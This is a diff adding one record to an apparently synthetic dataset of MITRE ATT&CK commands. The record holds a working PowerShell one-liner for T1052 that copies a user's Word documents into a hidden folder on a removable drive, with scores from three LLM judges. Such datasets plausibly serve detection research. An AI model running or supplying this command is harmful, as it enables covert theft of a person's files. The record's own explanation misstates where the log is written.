@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=(Get-Volume -DriveType Removable | Select -First 1 -Expand DriveLetter); $dest=\"$dl`:\\SystemData\"; New-Item -ItemType Directory -Force -Path $dest | Out-Null; attrib +h +s $dest; Copy-Item -Path \"$env:USERPROFILE\\Documents\\*.docx\" -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue; Write-Output \"Copied DOCX to $dest at $(Get-Date)\" | Out-File \"$dest\\op.log\" -Append",
+  "explanation": "Copies local DOCX files to a hidden folder on a removable drive for physical exfiltration; logs the action locally using Write-Output.",
+  "rationale_steps": [
+    "Identify first attached removable drive letter",
+    "Create and hide a destination directory on the removable media",
+    "Copy target document files to the removable media using Copy-Item",
+    "Record a local operation log via Write-Output to a file on the device"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-a3760856-2cf31eed",
+  "source_prompt_hash": "a3760856",
+  "timestamp_utc": "2025-09-30T05:14:51.683873Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is well-formed with valid cmdlets/parameters, proper escaping for the drive colon, balanced quotes, and correct use of separators.",
+        "semantic_score": 4,
+        "semantic_justification": "It selects a removable drive, creates a hidden/system directory, and copies DOCX files there while appending a log, but the log is written to the removable drive (not locally) and the process depends on a removable volume being present.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T09:02:56.826917Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with proper variable declarations, balanced quotes/parentheses/braces, appropriate command separators, valid cmdlet parameters, and correct error handling.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements the T1052 technique by identifying a removable drive, creating a hidden directory on it, copying document files from the user profile, and logging the exfiltration activity - all core components of physical medium exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T09:02:59.721289Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with correct PowerShell cmdlet usage, proper command separators, balanced quotes, and valid external command calls.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the described intent and T1052, accurately identifying a removable drive, creating a hidden staging directory, copying target files, and logging the action, demonstrating a plausible and effective physical exfiltration attempt.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T09:03:13.260669Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
